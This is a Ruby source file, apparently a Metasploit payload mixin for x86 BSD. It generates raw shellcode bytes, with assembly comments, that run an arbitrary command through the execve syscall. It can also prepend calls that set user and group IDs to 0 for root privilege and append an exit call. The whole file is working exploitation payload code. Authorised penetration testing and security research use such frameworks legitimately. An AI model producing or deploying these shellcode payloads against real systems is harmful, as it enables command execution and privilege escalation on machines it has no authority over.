# -*- coding: binary -*-
require 'msf/core'

###
# Contains common x86 BSD code
###
module Msf::Payload::Bsd
module X86

  def bsd_x86_exec_payload
    cmd_str   = datastore['CMD'] || ''
    # Split the cmd string into arg chunks
    cmd_parts = Shellwords.shellsplit(cmd_str)
    # the non-exe-path parts of the chunks need to be reversed for execve
    cmd_parts = ([cmd_parts.first] + (cmd_parts[1..-1] || []).reverse).compact
    arg_str = cmd_parts.map { |a| "#{a}\x00" }.join

    payload = ''

    # Stuff an array of arg strings into memory
    payload << "\x31\xc0"                          # xor eax, eax  (eax => 0)
    payload << Rex::Arch::X86.call(arg_str.length) # jmp over CMD_STR, stores &CMD_STR on stack
    payload << arg_str
    payload << "\x5B"                              # pop ebx (ebx => &CMD_STR)

    # now EBX contains &cmd_parts[0], the exe path
    if cmd_parts.length > 1
      # Build an array of pointers to arguments
      payload << "\x89\xD9"                     # mov ecx, ebx
      payload << "\x50"                         # push eax; null byte (end of array)
      payload << "\x89\xe2"                     # mov edx, esp (EDX points to the end-of-array null byte)

      cmd_parts[1..-1].each_with_index do |arg, idx|
        l = [cmd_parts[idx].length+1].pack('V')
        # can probably save space here by doing the loop in ASM
        # for each arg, push its current memory location on to the stack
        payload << "\x81\xC1"                 # add ecx, ...
        payload << l                          # (cmd_parts[idx] is the prev arg)
        payload << "\x51"                     # push ecx (&cmd_parts[idx])
      end

      payload << "\x53"                         # push ebx (&cmd_parts[0])
      payload << "\x89\xe1"                     # mov ecx, esp (ptr to ptr to first str)
      payload << "\x52"                         # push edx
      payload << "\x51"                         # push ecx
    else
      # pass NULL args array to execve() call
      payload << "\x50\x50"                     # push eax, push eax
    end

    payload << "\x53"                             # push ebx
    payload << "\xb0\x3b"                         # mov al, 0x3b (execve)
    payload << "\x50"                             # push eax
    payload << "\xcd\x80"                         # int 0x80 (triggers execve syscall)

    payload
  end

  def handle_x86_bsd_opts(pre, app)
    if (datastore['PrependSetresuid'])
      # setresuid(0, 0, 0)
      pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\x66\xb8\x37\x01"     + #   movw    $0x0137,%ax                #
             "\xcd\x80"               #   int     $0x80                      #
    end

    if (datastore['PrependSetreuid'])
      # setreuid(0, 0)
      pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\xb0\x7e"             + #   movb    $0x7e,%al                  #
             "\xcd\x80"               #   int     $0x80                      #
    end

    if (datastore['PrependSetuid'])
      # setuid(0)
      pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\xb0\x17"             + #   movb    $0x17,%al                  #
             "\xcd\x80"               #   int     $0x80                      #
    end

    if (datastore['PrependSetresgid'])
      # setresgid(0, 0, 0)
      pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\x66\xb8\x38\x01"     + #   movw    $0x0138,%ax                #
             "\xcd\x80"               #   int     $0x80                      #
    end

    if (datastore['PrependSetregid'])
      # setregid(0, 0)
      pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\xb0\x7f"             + #   movb    $0x7f,%al                  #
             "\xcd\x80"               #   int     $0x80                      #
    end

    if (datastore['PrependSetgid'])
      # setgid(0)
      pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\xb0\xb5"             + #   movb    $0xb5,%al                  #
             "\xcd\x80"               #   int     $0x80                      #
    end

    if (datastore['AppendExit'])
      # exit(0)
      app << "\x31\xc0"             + #   xorl    %eax,%eax                  #
             "\x50"                 + #   pushl   %eax                       #
             "\xb0\x01"             + #   movb    $0x01,%al                  #
             "\xcd\x80"               #   int     $0x80                      #
    end
  end

end
end
